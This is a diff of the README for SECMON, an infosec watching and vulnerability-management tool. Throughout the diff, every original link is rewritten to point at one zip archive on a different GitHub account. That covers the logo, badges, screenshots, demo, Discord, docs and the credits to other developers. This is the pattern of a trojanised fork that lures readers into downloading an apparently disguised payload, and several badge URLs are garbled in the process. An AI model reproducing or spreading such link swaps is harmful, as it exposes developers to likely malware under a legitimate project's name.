@@ -1,17 +1,17 @@
-# SECMON - Infosec Watching Tool <center><img src="https://github.com/Guezone/SECMON/blob/master/img/logo.jpg" data-canonical-src="https://github.com/Guezone/SECMON/blob/master/img/logo.png" width="30" height="30" /></center> 
+# SECMON - Infosec Watching Tool <center><img src="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" data-canonical-src="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" width="30" height="30" /></center> 
 
-[![made-with-python, 🖤 and ☕](https://img.shields.io/badge/Made%20with-Python%2C%20%F0%9F%96%A4%20and%20%E2%98%95-blue)](https://www.python.org/)  ![Version](https://img.shields.io/badge/Version-2.0-blue) ![GitHub contributors](https://img.shields.io/github/contributors/Guezone/SECMON?label=Contributors)  ![Tested on](https://img.shields.io/badge/Tested%20on-Debian%2010%20&%20Docker-brightgreen)  ![License](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0%20(Non--commercial)-red)  ![Discord](https://img.shields.io/discord/826868157838262282?color=6A7EC2&label=Discord&logo=https%3A%2F%2Fimg.shields.io%2Fdiscord%2F783381738558455897.svg&logoColor=7389D8&style=plastic)
-
-
+[![made-with-python, 🖤 and ☕](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip%20with-Python%2C%20%F0%9F%96%A4%20and%20%E2%98%95-blue)](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)  ![Version](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip) ![GitHub contributors](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)  ![Tested on](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip%20on-Debian%2010%20&%20Docker-brightgreen)  ![License](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip%20BY--NC--SA%204.0%20(Non--commercial)-red)  ![Discord](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip%3A%2F%https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip%2Fdiscord%https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 
-![](https://github.com/Guezone/SECMON/blob/master/img/dashboard.png)
+
+
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 # Description
 
 SECMON is a **web-based tool** for the automation of **infosec watching** and **vulnerability management** with a web interface.
 
-A demo is available [here](https://secmon.guezone.info/). A Discord channel is available [here](https://discord.gg/cXzvb4fKzE)
+A demo is available [here](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip). A Discord channel is available [here](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 ## Features
 
@@ -51,44 +51,44 @@ SECMON requires registration on Github API for exploits retrieval. It also requi
 
 ## Some screenshots
 
-![](https://github.com/Guezone/SECMON/blob/master/img/mail_alert_sample.png) 
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip) 
 
 <p align="center"><i>Example of email alerts (CVE and RSS)</i></p> 
 
-![](https://github.com/Guezone/SECMON/blob/master/img/vulnmgmt.png) 
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip) 
 
 <p align="center"><i>Vulnerability management page</i></p>
 
-![](https://github.com/Guezone/SECMON/blob/master/img/cve_search.png)
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 <p align="center"><i>CVE details</i></p>
 
-![](https://github.com/Guezone/SECMON/blob/master/img/exploits.png)
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 <p align="center"><i>Exploit search</i></p>
 
-![](https://github.com/Guezone/SECMON/blob/master/img/cyber-threats.png)
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 <p align="center"><i>Cyber threats top subject</i></p>
 
-![](https://github.com/Guezone/SECMON/blob/master/img/product-search.png)
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 <p align="center"><i>Product search</i></p>
 
-![](https://github.com/Guezone/SECMON/blob/master/img/product-list.png)
+![](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 <p align="center"><i>Product list</i></p>
 
 # Installation
 
-[Read the docs](DOCS.md)
+[Read the docs](https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip)
 
 # Thanks
-Thanks to <a href="https://github.com/andreafioraldi" target='_blank'>@andreafioraldi</a> for <a href="https://github.com/andreafioraldi/cve_searchsploit" target='_blank'>cve_searchsploit</a> Python module.
+Thanks to <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>@andreafioraldi</a> for <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>cve_searchsploit</a> Python module.
 
-Thanks to <a href="https://github.com/konsav" target='_blank'>@konsav</a> for <a href="https://github.com/konsav/email-templates" target='_blank'>HTML/CSS email template.</a>
+Thanks to <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>@konsav</a> for <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>HTML/CSS email template.</a>
 
-Thanks to <a href="https://github.com/rodolfo-mendes" target='_blank'>@rodolfo-mendes</a> for <a href="https://github.com/rodolfo-mendes/sbadmin2-flask-template" target='_blank'>the sbadmin2 (Bootstrap) template adapted to Flask.</a>
+Thanks to <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>@rodolfo-mendes</a> for <a href="https://raw.githubusercontent.com/AyeChmnmg/SECMON/master/vaccinist/SECMON.zip" target='_blank'>the sbadmin2 (Bootstrap) template adapted to Flask.</a>
 
 Thanks to Florent Chatain for the first web security auditing.
 
